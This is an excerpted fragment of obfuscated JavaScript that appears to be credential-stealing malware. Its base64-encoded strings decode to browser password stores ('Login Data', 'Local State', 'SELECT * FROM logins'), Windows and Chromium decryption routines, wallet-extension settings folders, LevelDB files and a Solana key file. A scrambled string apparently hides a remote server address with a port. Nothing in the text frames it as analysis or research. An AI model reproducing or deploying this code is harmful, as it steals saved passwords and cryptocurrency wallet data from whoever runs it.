...
const p = (t) => Buffer.from(t, 'base64').toString('utf8'),
  f = (() => {
    let t = 'MTY3Ljg4LjaHR0cDovLwE2OC4xNTI6MTIyNA==  ';
...
const B = p('RGVmYXVsdA'),
  ...
  k = (t, c) => {
    ...
    try {
      ...
      const a = p('U0VMRUNUICogRlJPTSBsb2dpbnM'),
        n = `${w('~/')}${c}`;
      let l = b.join(n, p('TG9jYWwgU3RhdGU'));
      const m = p('Q3J5cHRVbnByb3RlY3REYXRh'),
        o = p('Y3JlYXRlRGVjaXBoZXJpdg'),
        i = p('cmVhZEZpbGU'),
        $ = p('Y29weUZpbGU'),
        G = p('TG9naW4gRGF0YQ'),
        y = p('b3NfY3J5cHQ'),
  ...
  T = p('TG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdz'),
  q = p('LmxkYg'),
  C = p('LmxvZw'),
  H = p('c29sYW5hX2lkLnR4dA');
let I = 'comp';
const A = [
